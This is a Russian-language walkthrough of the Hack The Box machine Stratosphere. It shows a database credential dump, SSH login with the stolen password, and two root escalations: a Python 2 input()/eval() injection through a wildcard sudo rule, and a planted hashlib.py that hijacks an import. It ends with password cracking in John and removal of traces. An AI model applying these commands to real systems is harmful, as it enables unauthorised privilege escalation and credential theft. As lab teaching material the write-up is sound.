**UPD.** В исследовательских целях был написан крошечный exploitation-фреймворк для генерации forward-shell'ов под различные уязвимости, ознакомиться можно [здесь](https://github.com/snovvcrash/FwdSh3ll "snovvcrash/FwdSh3ll: Forward shell generation framework.").

[![FwdSh3ll](https://asciinema.org/a/200295.png)](https://asciinema.org/a/200295?autoplay=1)

## PrivEsc: tomcat8 → richard
Далеко не отходя, нашли ASCII-text'ый файл `db_connect` с кредами авторизации в базу данных. Развернем pty-шелл самопальной командой `upgrade` нашего чудо-скрипта, чтобы не мучаться с синтаксисом one-liner'ов для извлечения информации из БД (сразу скажу, что первый набор кредов `ssn_admin:AWs64@on*&` — это rabbit hole, под этой учеткой в базе данных пусто):
```
stratosphere> upgrade
tomcat8@stratosphere:~$
mysql -u admin -p"admin"
mysql -u admin -p"admin"
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| users              |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]>
use users
use users
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [users]>
show tables;
show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| accounts        |
+-----------------+
1 row in set (0.00 sec)

MariaDB [users]>
select * from accounts;
select * from accounts;
+------------------+---------------------------+----------+
| fullName         | password                  | username |
+------------------+---------------------------+----------+
| Richard F. Smith | 9tc*rhKuG5TyXvUJOrE^5CK7k | richard  |
+------------------+---------------------------+----------+
1 row in set (0.00 sec)
```

Выдвину уникальное предположение, что это авторизационные данные пользователя richard (и не прогадаю :smiling_imp:)!

# SSH — Порт 22 (внутри машины)
Подключимся к машине по SSH (для удобства передаем пароль как аргумент командной строки и пропускаем проверку сертификата — учебная же все же машина):
```
root@kali:~# sshpass -p '9tc*rhKuG5TyXvUJOrE^5CK7k' ssh -oStrictHostKeyChecking=no richard@10.10.10.64
richard@stratosphere:~$ whoami
richard

richard@stratosphere:~$ id
uid=1000(richard) gid=1000(richard) groups=1000(richard),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),116(scanner)

richard@stratosphere:~$ ls -la
total 40
drwxr-x--- 5 richard richard 4096 Mar 19 15:23 .
drwxr-xr-x 4 root    root    4096 Sep 19  2017 ..
lrwxrwxrwx 1 root    root       9 Feb 10  2018 .bash_history -> /dev/null
-rw-r--r-- 1 richard richard  220 Sep 19  2017 .bash_logout
-rw-r--r-- 1 richard richard 3526 Sep 19  2017 .bashrc
drwxr-xr-x 3 richard richard 4096 Oct 18  2017 .cache
drwxr-xr-x 3 richard richard 4096 Oct 18  2017 .config
drwxr-xr-x 2 richard richard 4096 Oct 18  2017 Desktop
-rw-r--r-- 1 richard richard  675 Sep 19  2017 .profile
-rwxr-x--- 1 root    richard 1507 Mar 19 15:23 test.py
-r-------- 1 richard richard   33 Feb 27  2018 user.txt
```

## user.txt
Заберем флаг пользователя:
```text
richard@stratosphere:~$ cat /home/richard/user.txt
e610b298????????????????????????
```

И конечно сразу же посмотрим на уже привлекший наше внимание скрипт `test.py`:
```python
#!/usr/bin/python3
import hashlib


def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()
```

Нас просят разреверсить несколько хешей, обещая при этом снисхождение манны небесной в виде выполнения файла `/root/success.py` (что в последствии окажется гнусной подставой, но об этом позже). Чувствую подвох здесь я, юный падаван, поэтому сразу начнем искать способ эксплуатации.

## PrivEsc: richard → root. Способ 1
Первое, что бросается в глаза, так это то, что шебанг привязан к `python3`. К тому же, если сорвать покровы софт линка:
```text
richard@stratosphere:~$ ls -l /usr/bin/python
lrwxrwxrwx 1 root root 16 Feb 11  2018 /usr/bin/python -> /usr/bin/python3
```

Видно, что команда `python` так же указывает на интерпретатор 3-й версии. Уже второй раз нам активно внушают идею запуска скрипта именно с помощью этой версии питона... Не совсем обычно, зацепка? Памятуя о том, **кто** владелец файла, посмотрим на вывод `sudo -l`:
```
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```

`/usr/bin/python*`??? What's that wildcard `*`?? Это фейл, ребят. Смотрим на доступные питоны в системы:
```text
richard@stratosphere:~$ ls -l /usr/bin/python*
lrwxrwxrwx 1 root root      16 Feb 11  2018 /usr/bin/python -> /usr/bin/python3
lrwxrwxrwx 1 root root       9 Jan 24  2017 /usr/bin/python2 -> python2.7
-rwxr-xr-x 1 root root 3779512 Nov 24  2017 /usr/bin/python2.7
lrwxrwxrwx 1 root root       9 Jan 20  2017 /usr/bin/python3 -> python3.5
-rwxr-xr-x 2 root root 4747120 Jan 19  2017 /usr/bin/python3.5
-rwxr-xr-x 2 root root 4747120 Jan 19  2017 /usr/bin/python3.5m
lrwxrwxrwx 1 root root      10 Jan 20  2017 /usr/bin/python3m -> python3.5m
```

[Известно](https://docs.python.org/2/library/functions.html#input "2. Built-in Functions — Python 2.7.15 documentation"), что в Python 2 функция `input()` эквивалентна такой конструкции: `eval(raw_input())`. Поэтому запуск `test.py` с помощью Python 2 позволит пользователю выполнять системные команды, в данном случае от имени рута, чем мы собственно и займемся.

В [этом](https://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html "Vipul Chaskar's Blog: Exploiting eval() function in Python") посте хорошо описан механизм эксплуатации функции `eval()` для Пайтона, а я же просто ~~поимею~~ получу root-сессию:
```text
richard@stratosphere:~$ sudo /usr/bin/python2 ~/test.py
Solve: 5af003e100c80923ec04d65933d382cb
__import__('os').system('/bin/bash')

root@stratosphere:/home/richard# whoami
root

root@stratosphere:/home/richard# id
uid=0(root) gid=0(root) groups=0(root)
```

### root.txt
```text
root@stratosphere:/home/richard# cat /root/root.txt
d41d8cd9????????????????????????
```

Кстати, уже сейчас можно разоблачить негодяев, удостоверившись в том, что обещанного `/root/success.py` не существует:
```text
root@stratosphere:/home/richard# ls /root/success.py
ls: cannot access '/root/success.py': No such file or directory
```

Но в [эпилоге]({{ page.url }}#хеши) мы все же сломаем пару хешей. Так, разминки ради.

## PrivEsc: richard → root. Способ 2
В начале исходника нельзя не заметить импорт библиотеки `hashlib` для вычисления хеш-значений вводимых строк. Угоним же эту библиотеку?

Для этого нам необходимо узнать порядок резолва путей, по которым будет производиться импорт модулей. Сделать это можно такой командой:
```text
richard@stratosphere:~$ python -c 'import sys; print(sys.path)'
['', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages']
```

Пустые кавычки в начале означают текущий каталог (CWD). То что нам нужно, я считаю!

Создадим фейковую библиотеку `hashlib.py` с нужным нам пейлоадом (можно построить реверс-шелл, или так же получить root-сессию, как и в первом способе, но для простоты я ограничусь просто выводом флага на экран — идея ясна):
```
richard@stratosphere:~$ echo 'import os; os.system("cat /root/root.txt")' > hashlib.py

richard@stratosphere:~$ ls -l *.py
-rw-r--r-- 1 richard richard   43 Sep  4 15:19 hashlib.py
-rwxr-x--- 1 root    richard 1507 Mar 19 15:23 test.py
```

И со спокойной совестью запустим скрипт:
```text
richard@stratosphere:~$ sudo /usr/bin/python ~/test.py
d41d8cd9????????????????????????
Solve: 5af003e100c80923ec04d65933d382cb
^C
```

Чистим следы пребывания в системе and we're done with this box:
```text
richard@stratosphere:~$ rm hashlib.py
richard@stratosphere:~$ rm /dev/shm/input* /dev/shm/output*
```

Stratosphere пройдена :triumph:

![owned-user.png]({{ "/img/htb/boxes/stratosphere/owned-user.png" | relative_url }})
{: .center-image}

![owned-root.png]({{ "/img/htb/boxes/stratosphere/owned-root.png" | relative_url }})
{: .center-image}

![trophy.png]({{ "/img/htb/boxes/stratosphere/trophy.png" | relative_url }})
{: .center-image}

# Эпилог
## Хеши
Шутки ради попрошу своего друга Джона решить предлагаемые тестом хеши:
```text
root@kali:~# echo '5af003e100c80923ec04d65933d382cb' > strat.md5
root@kali:~# echo 'd24f6fb449855ff42344feff18ee2819033529ff' > strat.sha1
root@kali:~# echo '91ae5fc9ecbca9d346225063f23d2bd9' > strat.md4
root@kali:~# echo '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943' > strat.blake2b512

root@kali:~# john strat.md5 --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
...
kaybboo!
...

root@kali:~# john strat.sha1 --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1
...
ninjaabisshinobi
...

root@kali:~# john strat.md4 --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD4
...
legend72
...

root@kali:~# john strat.blake2b512 --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-Blake2
...
Fhero6610
...
```

Скормим их `/home/richard/test.py`:
```
richard@stratosphere:~$ sudo /usr/bin/python ~/test.py
Solve: 5af003e100c80923ec04d65933d382cb
kaybboo!
You got it!
Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff
ninjaabisshinobi
WOW, you're really good at this!
How about this? 91ae5fc9ecbca9d346225063f23d2bd9
legend72
OK, OK! I get it. You know how to crack hashes...
Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943
Fhero6610
sh: 1: /root/success.py: not found
```

Мораль — не верь на слово подлым Python-тестам :angry:
